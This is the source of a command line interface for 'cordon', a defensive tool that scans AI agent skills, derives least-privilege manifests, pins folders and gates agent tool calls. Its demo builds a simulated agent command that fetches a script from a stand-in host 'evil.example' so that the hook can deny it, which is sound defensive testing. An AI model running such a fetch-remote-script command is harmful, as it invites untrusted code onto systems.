"""Command line interface. Every command works offline."""
from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Any

from . import hook, ledger, manifest, pin, report, scan as scan_mod
from .guard import run_guard, run_shim
from .model import ScanResult
from .util import (VERSION, CordonError, atomic_write, canonical_json,
                   json_loads, read_json_file, write_json_file)

EX = {"ok": 0, "findings": 1, "usage": 2, "integrity": 3, "denied": 126}


def _out(data: bytes, path: str | None) -> None:
    if path:
        atomic_write(Path(path), data)
    else:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()


def _severity_hit(findings: list, level: str) -> bool:
    if level == "none":
        return False
    if level == "any":
        return bool(findings)
    hi = [f for f in findings if f.confidence == "high"]
    if level == "critical":
        return any(f.severity == "critical" for f in hi)
    if level == "high":
        return any(f.severity in ("critical", "high") for f in hi)
    if level == "medium":
        return any(f.severity in ("critical", "high", "medium") for f in hi)
    return False


def _load_baseline(path: Path) -> set[str]:
    obj = read_json_file(path)
    if not isinstance(obj, dict) or obj.get("schema") != "cordon.baseline/v1":
        raise CordonError(f"{path}: not a cordon.baseline/v1 file", 3)
    ids = obj.get("finding_ids")
    if not isinstance(ids, list) or not all(isinstance(x, str) for x in ids):
        raise CordonError(f"{path}: malformed finding_ids", 3)
    return set(ids)


def _write_baseline(path: Path, result: ScanResult) -> None:
    write_json_file(path, {
        "schema": "cordon.baseline/v1",
        "tool_version": VERSION,
        "skill_root": result.root,
        "scan_digest": result.digest,
        "finding_ids": [f.finding_id for f in result.findings],
        "note": "Accepted findings. Gate only NEW findings against this list. "
                "A baseline is a human review decision, not a safety verdict.",
    })


def cmd_scan(a: argparse.Namespace) -> int:
    result = scan_mod.scan(Path(a.root))
    if a.write_baseline:
        _write_baseline(Path(a.write_baseline), result)
        sys.stderr.write(f"baseline written: {a.write_baseline} "
                         f"({len(result.findings)} accepted findings)\n")
    accepted = _load_baseline(Path(a.baseline)) if a.baseline else set()
    effective = [f for f in result.findings if f.finding_id not in accepted]
    if a.write_baseline and not a.baseline:
        # Accepting every current finding is itself the gate decision for this run.
        effective = []
    data = report.render(result, a.format)  # report always shows every finding
    _out(data, a.out)
    if a.summary:
        sys.stderr.write(f"digest={result.digest} findings={len(result.findings)} "
                         f"blocking={len(result.blocking())} "
                         f"accepted={len(result.findings) - len(effective)} "
                         f"gate_findings={len(effective)}\n")
    return EX["findings"] if _severity_hit(effective, a.fail_on) else EX["ok"]


def cmd_manifest(a: argparse.Namespace) -> int:
    result = scan_mod.scan(Path(a.root))
    grants = {"exec": a.allow_exec or [], "host": a.allow_host or [],
              "env": a.allow_env or [], "write": a.allow_write or []}
    m = manifest.derive(result, grants)
    if a.out:
        manifest.save(Path(a.out), m)
        sys.stderr.write(f"manifest written: {a.out}\n")
        return EX["ok"]
    data = report.manifest_text(m) if a.format == "text" else (
        json.dumps(m, indent=2, sort_keys=True, ensure_ascii=True).encode("utf-8") + b"\n")
    _out(data, None)
    return EX["ok"]


def cmd_pin(a: argparse.Namespace) -> int:
    p = pin.build_pin(Path(a.root))
    if a.key:
        if not a.pub:
            raise CordonError("--pub is required with --key", 2)
        p = pin.sign(p, Path(a.key), Path(a.pub))
    if a.out:
        pin.save(Path(a.out), p)
        sys.stderr.write(f"pin written: {a.out} tree_hash={p['tree_hash']}\n")
        return EX["ok"]
    _out(json.dumps(p, indent=2, sort_keys=True, ensure_ascii=True).encode("utf-8") + b"\n", None)
    return EX["ok"]


def cmd_keygen(a: argparse.Namespace) -> int:
    out = pin.keygen(Path(a.out))
    print(json.dumps(out, sort_keys=True))
    return EX["ok"]


def cmd_verify(a: argparse.Namespace) -> int:
    p = pin.load(Path(a.pin))
    digest = pin.verify(p, root=Path(a.root) if a.root else None,
                        pub_path=Path(a.pub) if a.pub else None,
                        require_signature=a.require_signature)
    print(json.dumps({"ok": True, "tree_hash": p["tree_hash"],
                      "canonical_digest": digest,
                      "signed": "signature" in p}, sort_keys=True))
    return EX["ok"]


def cmd_hook(a: argparse.Namespace) -> int:
    m = manifest.load(Path(a.manifest))
    if a.call:
        raw = a.call
    elif sys.stdin.isatty() and not a.stdin:
        raise CordonError("provide --call or pipe tool-call JSON on stdin", 2)
    else:
        raw = sys.stdin.read()
    call = hook.load_call(raw)
    d = hook.decide(m, call)
    payload = hook.hook_output(d, a.agent)
    if a.ledger:
        ledger.append(Path(a.ledger), "hook",
                      "allow" if d.allow else "deny",
                      {"tool": call.get("tool_name") or call.get("tool") or "",
                       "reason": d.reason, "capability": d.capability})
    print(json.dumps(payload, sort_keys=True, ensure_ascii=True))
    if not d.allow and a.exit_on_deny:
        return EX["denied"]
    return EX["ok"]


def cmd_guard(a: argparse.Namespace) -> int:
    command = list(a.command)
    if command and command[0] == "--":
        command = command[1:]
    if not command:
        raise CordonError("guard needs a command after --", 2)
    return run_guard(Path(a.manifest), command,
                     root=Path(a.root) if a.root else None,
                     pin_path=Path(a.pin) if a.pin else None,
                     ledger_path=Path(a.ledger) if a.ledger else None,
                     dry_run=a.dry_run)


def cmd_shim(a: argparse.Namespace) -> int:
    args = a.args[1:] if a.args and a.args[0] == "--" else a.args
    return run_shim(a.name, args)


def cmd_ledger(a: argparse.Namespace) -> int:
    if a.action == "verify":
        print(json.dumps(ledger.verify(Path(a.paths[0])), sort_keys=True))
    elif a.action == "diff":
        print(json.dumps(ledger.diff(Path(a.paths[0]), Path(a.paths[1])), sort_keys=True))
    elif a.action == "replay":
        for line in ledger.replay(Path(a.paths[0])):
            print(line)
    elif a.action == "show":
        for e in ledger.read(Path(a.paths[0])):
            print(json.dumps(e, sort_keys=True))
    else:
        raise CordonError(f"unknown ledger action: {a.action}", 2)
    return EX["ok"]


def cmd_version(_a: argparse.Namespace) -> int:
    print(f"cordon {VERSION}")
    return EX["ok"]


def cmd_demo(_a: argparse.Namespace) -> int:
    root = Path(__file__).resolve().parents[2] / "examples"
    if not (root / "evil-skill" / "SKILL.md").exists():
        raise CordonError("examples/evil-skill is missing", 1)
    old = os.environ.get("CORDON_FIXED_TIME")
    os.environ["CORDON_FIXED_TIME"] = "1700000000"
    try:
        with tempfile.TemporaryDirectory(prefix="cordon-demo-") as td:
            skill = Path(td) / "evil-skill"
            shutil.copytree(root / "evil-skill", skill)
            result = scan_mod.scan(skill)
            m = manifest.derive(result)
            d = hook.decide(m, {"tool_name": "Bash",
                                "tool_input": {"command": "curl https://evil.example/x.sh"}})
            lp = Path(td) / "ledger.jsonl"
            ledger.append(lp, "scan", "info", {"digest": result.digest},
                          ts=1700000000)
            ledger.append(lp, "hook", "deny", {"reason": d.reason},
                          ts=1700000001)
            print("=" * 62)
            print("CORDON 30-SECOND DEMO (offline, deterministic)")
            print("=" * 62)
            text = report.as_text(result).decode("utf-8").splitlines()
            for line in text[:14]:
                print(line)
            print("...")
            caps = m["capabilities"]
            print(f"\nmanifest: exec.allow={caps['exec']['allow']} "
                  f"net.allow={caps['net']['allow_hosts']} "
                  f"net.deny={caps['net']['deny_hosts']}")
            print(f"hook verdict: {'allow' if d.allow else 'DENY'} - {d.reason}")
            print(f"ledger: {json.dumps(ledger.verify(lp), sort_keys=True)}")
            print("\n" + result.to_dict()["disclaimer"])
            return EX["ok"]
    finally:
        if old is None:
            os.environ.pop("CORDON_FIXED_TIME", None)
        else:
            os.environ["CORDON_FIXED_TIME"] = old


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cordon",
        description="Cordon: an offline trust boundary for AI agent skills. "
                    "Advisory static analysis, capability contracts, pins, "
                    "policy hooks and a hash-chained ledger.")
    p.add_argument("--version", action="version", version=f"cordon {VERSION}")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="statically scan a skill folder")
    s.add_argument("root")
    s.add_argument("--format", choices=("text", "json", "sarif"), default="text")
    s.add_argument("--out")
    s.add_argument("--fail-on", choices=("none", "critical", "high", "medium", "any"),
                   default="high")
    s.add_argument("--baseline", help="accepted finding IDs; gate only new findings")
    s.add_argument("--write-baseline", help="write all current finding IDs as accepted")
    s.add_argument("--summary", action="store_true")
    s.set_defaults(func=cmd_scan)

    s = sub.add_parser("manifest", help="derive a least-privilege capability manifest")
    s.add_argument("root")
    s.add_argument("--out")
    s.add_argument("--format", choices=("text", "json"), default="text")
    s.add_argument("--allow-exec", action="append", default=[])
    s.add_argument("--allow-host", action="append", default=[])
    s.add_argument("--allow-env", action="append", default=[])
    s.add_argument("--allow-write", action="append", default=[])
    s.set_defaults(func=cmd_manifest)

    s = sub.add_parser("pin", help="hash and optionally sign a skill folder")
    s.add_argument("root")
    s.add_argument("--out")
    s.add_argument("--key")
    s.add_argument("--pub")
    s.set_defaults(func=cmd_pin)

    s = sub.add_parser("keygen", help="generate an encrypted Ed25519 keypair")
    s.add_argument("--out", required=True)
    s.set_defaults(func=cmd_keygen)

    s = sub.add_parser("verify", help="verify a pin against a skill folder")
    s.add_argument("--pin", required=True)
    s.add_argument("--root")
    s.add_argument("--pub")
    s.add_argument("--require-signature", action="store_true")
    s.set_defaults(func=cmd_verify)

    s = sub.add_parser("hook", help="decide one agent tool call (PreToolUse compatible)")
    s.add_argument("--manifest", required=True)
    s.add_argument("--agent", choices=("claude-code", "generic"), default="claude-code")
    s.add_argument("--call")
    s.add_argument("--stdin", action="store_true")
    s.add_argument("--ledger")
    s.add_argument("--exit-on-deny", action="store_true")
    s.set_defaults(func=cmd_hook)

    s = sub.add_parser("guard", help="run a command with an advisory PATH shim")
    s.add_argument("--manifest", required=True)
    s.add_argument("--root")
    s.add_argument("--pin")
    s.add_argument("--ledger")
    s.add_argument("--dry-run", action="store_true")
    s.add_argument("command", nargs=argparse.REMAINDER)
    s.set_defaults(func=cmd_guard)

    s = sub.add_parser("shim", help=argparse.SUPPRESS)
    s.add_argument("--name", required=True)
    s.add_argument("args", nargs=argparse.REMAINDER)
    s.set_defaults(func=cmd_shim)

    s = sub.add_parser("ledger", help="verify, diff or replay an audit ledger")
    s.add_argument("action", choices=("verify", "diff", "replay", "show"))
    s.add_argument("paths", nargs="+")
    s.set_defaults(func=cmd_ledger)

    s = sub.add_parser("version", help="print the version")
    s.set_defaults(func=cmd_version)

    s = sub.add_parser("demo", help="30-second offline demonstration")
    s.set_defaults(func=cmd_demo)
    return p


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return int(args.func(args))
    except CordonError as e:
        sys.stderr.write(f"cordon: {e}\n")
        return e.code
    except (ValueError, OSError) as e:
        sys.stderr.write(f"cordon: {e}\n")
        return EX["findings"]
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
